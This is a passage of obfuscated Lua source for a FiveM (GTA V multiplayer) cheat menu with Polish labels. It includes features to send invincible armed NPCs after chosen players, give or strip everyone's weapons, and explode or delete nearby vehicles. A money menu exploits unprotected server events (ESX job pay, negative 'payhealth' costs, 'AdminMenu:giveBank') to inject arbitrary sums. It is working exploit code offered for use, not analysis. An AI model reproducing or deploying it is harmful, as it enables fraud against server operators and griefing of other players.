                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, false)
                                SetNetworkIdCanMigrate(ei, true)
                                SetNetworkIdExistsOnAllMachines(ei, true)
                                Citizen.Wait(500)
                                NetToPed(ei)
                                GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
                                SetEntityInvincible(ped, true)
                                SetPedCanSwitchWeapon(ped, true)
                                TaskCombatPed(ped, GetPlayerPed(SelectedPlayer), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(SelectedPlayer)) then
                                TaskCombatHatedTargetsInArea(ped, bK.x, bK.y, bK.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                end
				KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('modelezresp') then
			 if KoGuSzEk.B("~h~~g~Ziolo") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), waduyh487r64)
                        local obj = CreateObject(Ggggg("prop_weed_01"),coords.x,coords.y,coords.z,waduyh487r64,waduyh487r64,waduyh487r64)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                            end
                        end
                    elseif KoGuSzEk.B("~h~~r~UFO") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), waduyh487r64)
                        local obj = CreateObject(Ggggg("p_spinning_anus_s"),coords.x,coords.y,coords.z,waduyh487r64,waduyh487r64,waduyh487r64)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                            end
                        end
                    elseif KoGuSzEk.B("~h~~y~Wiatrak") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), waduyh487r64)
                        local obj = CreateObject(Ggggg("prop_windmill_01"),coords.x,coords.y,coords.z,waduyh487r64,waduyh487r64,waduyh487r64)
                        if attachProp then
                            if selectedBone == 1 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),39317),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                            elseif selectedBone == 2 then
                                AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                            end
                        end
                    elseif KoGuSzEk.B("~h~~r~Customowy model") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), waduyh487r64)
                        local input = pikgfrihfg("wpisz nazwe", "", 100)
                        if IsModelValid(input) then
                            local obj = CreateObject(Ggggg(input),coords.x,coords.y,coords.z,waduyh487r64,waduyh487r64,waduyh487r64)
                            if attachProp then
                                if selectedBone == 1 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),31086),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                                elseif selectedBone == 2 then
                                    AttachEntityToEntity(obj,GetPlayerPed(selectedPlayer),GetPedBoneIndex(GetPlayerPed(selectedPlayer),28422),0.4,0,0,0,270.0,60.0,waduyh487r64,waduyh487r64,KZjx,waduyh487r64,1,waduyh487r64)
                                end
                            end
                        else
                            adyt23h23("Invalid Model!")
                        end
                    end
			
                
				
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('TeleportMenu') then
                if KoGuSzEk.B('~h~Tepnij do ~g~znacznika') then
                    c6()
                elseif KoGuSzEk.B('~h~Tepnij do ~g~najblizszego ~w~auta') then
                    b_()
                elseif KoGuSzEk.B('~h~Tepnij do ~r~koordow') then
                    bT()
                elseif KoGuSzEk.B('~h~Narysuj customowy blip na mapie') then
                    bX()
                elseif
                    KoGuSzEk.c(
                        '~h~Pokaz ~g~Koordy',
                        showCoords,
                        function(dR)
                            showCoords = dR
                        end
                    )
                 then
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('WeaponMenu') then
                if KoGuSzEk.MB('~h~~p~»~w~ Dodaj pojedyncza bron', 'WeaponTypes') then
                elseif KoGuSzEk.B('~h~~g~Dodaj wszystkie bronie') then
                    for i = 1, #b6 do
                        GiveWeaponToPed(PlayerPedId(-1), GetHashKey(b6[i]), 1000, false, false)
                    end
                elseif KoGuSzEk.B('~h~~r~Usun wszystkie bronie') then
                    RemoveAllPedWeapons(PlayerPedId(-1), true)
                elseif KoGuSzEk.B('~h~Upusc obecna bron') then
                    local ak = GetPlayerPed(-1)
                    local b = GetSelectedPedWeapon(ak)
                    SetPedDropsInventoryWeapon(GetPlayerPed(-1), b, 0, 2.0, 0, -1)
                elseif KoGuSzEk.B('~h~~g~Daj wszystkie bronie ~w~kazdemu') then
                    for el = 0, 128 do
                        --if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
                            for i = 1, #b6 do
                                GiveWeaponToPed(GetPlayerPed(el), GetHashKey(b6[i]), 1000, false, false)
                            end
                        --end
                    end
                elseif KoGuSzEk.B('~h~~r~Usun wszystkie bronie ~w~kazdemu') then
                    for el = 0, 128 do
                        --if el ~= PlayerId(-1) and GetPlayerServerId(el) ~= 0 then
                            for i = 1, #b6 do
                                RemoveWeaponFromPed(GetPlayerPed(el), GetHashKey(b6[i]))
                            end
                        --end
                    end
                elseif KoGuSzEk.B('~h~Dodaj ammo') then
                    for i = 1, #b6 do
                        AddAmmoToPed(PlayerPedId(-1), GetHashKey(b6[i]), 200)
                    end
                elseif
                    KoGuSzEk.c(
                        '~h~~r~OneShot Kill',
                        oneshot,
                        function(dR)
                            oneshot = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~~g~R~r~a~y~i~w~n~o~w~r~o~g~w ~w~Flare Gun',
                        rainbowf,
                        function(dR)
                            rainbowf = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Vehicle Gun',
                        VehicleGun,
                        function(dR)
                            VehicleGun = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Delete Gun',
                        DeleteGun,
                        function(dR)
                            DeleteGun = dR
                        end
                    )
                 then
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('tunings') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, dE in pairs(bl) do
                    if dE.id == 'extra' and #checkValidVehicleExtras() ~= 0 then
                        if KoGuSzEk.MB(dE.name, dE.id) then
                        end
                    elseif dE.id == 'neon' then
                        if KoGuSzEk.MB(dE.name, dE.id) then
                        end
                    elseif dE.id == 'paint' then
                        if KoGuSzEk.MB(dE.name, dE.id) then
                        end
                    elseif dE.id == 'wheeltypes' then
                        if KoGuSzEk.MB(dE.name, dE.id) then
                        end
                    elseif dE.id == 'headlight' then
                        if KoGuSzEk.MB(dE.name, dE.id) then
                        end
                    elseif dE.id == 'licence' then
                        if KoGuSzEk.MB(dE.name, dE.id) then
                        end
                    else
                        local az = checkValidVehicleMods(dE.id)
                        for ci, dL in pairs(az) do
                            if KoGuSzEk.MB(dE.name, dE.id) then
                            end
                            break
                        end
                    end
                end
                if IsToggleModOn(veh, 22) then
                    xenonStatus = 'Installed'
                else
                    xenonStatus = 'Not Installed'
                end
                if KoGuSzEk.B('Xenon Headlight', xenonStatus) then
                    if not IsToggleModOn(veh, 22) then
                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    else
                        ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('performance') then
                veh = GetVehiclePedIsUsing(PlayerPedId())
                for i, dE in pairs(bm) do
                    if KoGuSzEk.MB(dE.name, dE.id) then
                    end
                end
                if IsToggleModOn(veh, 18) then
                    turboStatus = 'Installed'
                else
                    turboStatus = 'Not Installed'
                end
                if KoGuSzEk.B('~h~~w~Turbo ~h~Tune', turboStatus) then
                    if not IsToggleModOn(veh, 18) then
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    else
                        ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('primary') then
                KoGuSzEk.MB('~h~~p~»~w~ Classic', 'classic1')
                KoGuSzEk.MB('~h~~p~»~w~ Metallic', 'metallic1')
                KoGuSzEk.MB('~h~~p~»~w~ Matte', 'matte1')
                KoGuSzEk.MB('~h~~p~»~w~ Metal', 'metal1')
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('secondary') then
                KoGuSzEk.MB('~h~~p~»~w~ Classic', 'classic2')
                KoGuSzEk.MB('~h~~p~»~w~ Metallic', 'metallic2')
                KoGuSzEk.MB('~h~~p~»~w~ Matte', 'matte2')
                KoGuSzEk.MB('~h~~p~»~w~ Metal', 'metal2')
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('rimpaint') then
                KoGuSzEk.MB('~h~~p~»~w~ Classic', 'classic3')
                KoGuSzEk.MB('~h~~p~»~w~ Metallic', 'metallic3')
                KoGuSzEk.MB('~h~~p~»~w~ Matte', 'matte3')
                KoGuSzEk.MB('~h~~p~»~w~ Metal', 'metal3')
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('classic1') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and tp == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if KoGuSzEk.B(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        elseif bg and curprim == em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and curprim ~= em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        end
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('metallic1') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and tp == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if KoGuSzEk.B(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        elseif bg and curprim == em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and curprim ~= em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        end
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('matte1') then
                for dK, em in pairs(bt) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and tp == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if KoGuSzEk.B(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleColours(veh, em.id, oldsec)
                            bg = true
                        elseif bg and curprim == em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and curprim ~= em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        end
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('metal1') then
                for dK, em in pairs(bu) do
                    tp, ts = GetVehicleColours(veh)
                    if tp == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and tp == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if KoGuSzEk.B(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            SetVehicleColours(veh, em.id, oldsec)
                            bg = true
                        elseif bg and curprim == em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and curprim ~= em.id then
                            SetVehicleColours(veh, em.id, oldsec)
                            SetVehicleExtraColours(veh, em.id, oldwheelcolour)
                            bg = true
                        end
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('classic2') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if KoGuSzEk.B(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            bh = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        elseif bg and cursec == em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and cursec ~= em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        end
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('metallic2') then
                for dK, em in pairs(br) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if KoGuSzEk.B(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            bh = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        elseif bg and cursec == em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and cursec ~= em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        end
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('matte2') then
                for dK, em in pairs(bt) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if KoGuSzEk.B(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            bh = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        elseif bg and cursec == em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and cursec ~= em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        end
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('metal2') then
                for dK, em in pairs(bu) do
                    tp, ts = GetVehicleColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    curprim, cursec = GetVehicleColours(veh)
                    if KoGuSzEk.B(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            bh = table.pack(oldprim, oldsec)
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        elseif bg and cursec == em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and cursec ~= em.id then
                            SetVehicleColours(veh, oldprim, em.id)
                            bg = true
                        end
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('classic3') then
                for dK, em in pairs(br) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if KoGuSzEk.B(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        elseif bg and currims == em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and currims ~= em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        end
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('metallic3') then
                for dK, em in pairs(br) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if KoGuSzEk.B(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        elseif bg and currims == em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and currims ~= em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        end
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('matte3') then
                for dK, em in pairs(bt) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if KoGuSzEk.B(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        elseif bg and currims == em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and currims ~= em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        end
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('metal3') then
                for dK, em in pairs(bu) do
                    _, ts = GetVehicleExtraColours(veh)
                    if ts == em.id and not bg then
                        pricetext = 'Installed'
                    else
                        if bg and ts == em.id then
                            pricetext = 'Previewing'
                        else
                            pricetext = 'Not Installed'
                        end
                    end
                    _, currims = GetVehicleExtraColours(veh)
                    if KoGuSzEk.B(em.name, pricetext) then
                        if not bg then
                            bi = 'paint'
                            bk = false
                            oldprim, oldsec = GetVehicleColours(veh)
                            oldpearl, oldwheelcolour = GetVehicleExtraColours(veh)
                            bh = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour)
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        elseif bg and currims == em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = false
                            bi = -1
                            bh = -1
                        elseif bg and currims ~= em.id then
                            SetVehicleExtraColours(veh, oldpearl, em.id)
                            bg = true
                        end
                    end
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('VehicleMenu') then
                if KoGuSzEk.MB('~h~~p~»~w~ ~h~~w~LSC ~w~Customs', 'LSC') then
                elseif KoGuSzEk.MB('~h~~p~»~w~ ~g~Boost Autek', 'BoostMenu') then
                elseif KoGuSzEk.MB('~h~~p~»~w~ Lista autek', 'CarTypes') then
                elseif KoGuSzEk.MB('~h~~p~»~w~ Rozpierdol autek', 'GCT') then
                elseif KoGuSzEk.MB('~h~~p~»~w~ Przyczepy pierdolonexd', 'MainTrailer') then
				elseif KoGuSzEk.B('~h~~w~Kup ~w~auto za ~g~darmo') then
                    freevehc1()
                elseif KoGuSzEk.B('~h~Zresp ~r~Customowe ~w~Auto') then
                    ca()
                elseif KoGuSzEk.B('~h~~r~Usun ~w~Auto') then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif KoGuSzEk.B('~h~~g~Napraw ~w~Auto') then
                    cc()
                elseif KoGuSzEk.B('~h~~g~Napraw ~w~Silnik') then
                    cd()
                elseif KoGuSzEk.B('~h~~g~Obroc ~w~Auto') then
                    daojosdinpatpemata()
                elseif KoGuSzEk.B('~h~~w~Max ~w~Tuning') then
                    MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
                elseif KoGuSzEk.B('~h~~g~Sterowane ~w~Autko') then
                    ce()
                    KoGuSzEk.CloseMenu()
                elseif
                    KoGuSzEk.c(
                        '~h~No Fall',
                        Nofall,
                        function(dR)
                            Nofall = dR
                            SetPedCanBeKnockedOffVehicle(PlayerPedId(-1), Nofall)
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~G0d mode auta',
                        VehGod,
                        function(dR)
                            VehGod = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~Przyspieszenie ~g~SHIFT ~r~CTRL',
                        VehSpeed,
                        function(dR)
                            VehSpeed = dR
                        end
                    )
                 then
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('GCT') then
                if
                    KoGuSzEk.c(
                        '~h~~r~Zepsuj~w~ Najblizsze auta',
                        destroyvehicles,
                        function(dR)
                            destroyvehicles = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~~r~Usun~w~ Najblizsze auta',
                        deletenearestvehicle,
                        function(dR)
                            deletenearestvehicle = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~~r~Wysadz~w~ Najblizsze auta',
                        explodevehicles,
                        function(dR)
                            explodevehicles = dR
                        end
                    )
                 then
                elseif
                    KoGuSzEk.c(
                        '~h~~p~Zabaw sie~w~ najblizszym autem',
                        fuckallcars,
                        function(dR)
                            fuckallcars = dR
                        end
                    )
                 then
                end
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('MoneyMenu') then
                 if KoGuSzEk.B('~h~~o~Automatyczne pieniadze ~r~ UWAGA!') then
                    automaticmoneyesx()
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Caution Give Back') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_jobs:caution', 'give_back', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Advanced Garage') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'esx_advancedgarage:payhealth',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Eden Garage') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'eden_garage:payhealth',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Fuel Delivery') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_fueldelivery:pay', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Car Thief') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_carthief:pay', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~DMV School') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'esx_dmvschool:pay',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif KoGuSzEk.B('~g~~h~FUEL ~y~Legacy Fuel') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent(
                            'LegacyFuel:PayFuel',
                            {
                                costs = -m
                            }
                        )
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Dirty Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_godirtyjob:pay', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Pizza Boy') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_pizza:pay', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Ranger Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_ranger:pay', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Garbage Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_garbagejob:pay', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY') then
                    local m = KeyboardInput('Enter amount of dirty money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_carthief:pay', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Trucker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_truckerjob:pay', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Admin Give Bank') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('AdminMenu:giveBank', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Admin Give Cash') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('AdminMenu:giveCash', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Postal Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_gopostaljob:pay', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Banker Job') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_banksecurity:pay', m)
                    end
                elseif KoGuSzEk.B('~g~~h~ESX ~y~Slot Machine') then
                    local m = KeyboardInput('Enter amount of money', '', 100)
                    if m ~= '' then
                        TriggerServerEvent('esx_slotmachine:sv:2', m)
                    end
                elseif
                    KoGuSzEk.c(
                        '~g~~h~ESX Hunting~y~ reward',
                        huntspam,
                        function(dR)
                            huntspam = dR
                        end
                    )
                 then
               
                end
                
                KoGuSzEk.Display()
            elseif KoGuSzEk.IsMenuOpened('AdvM') then
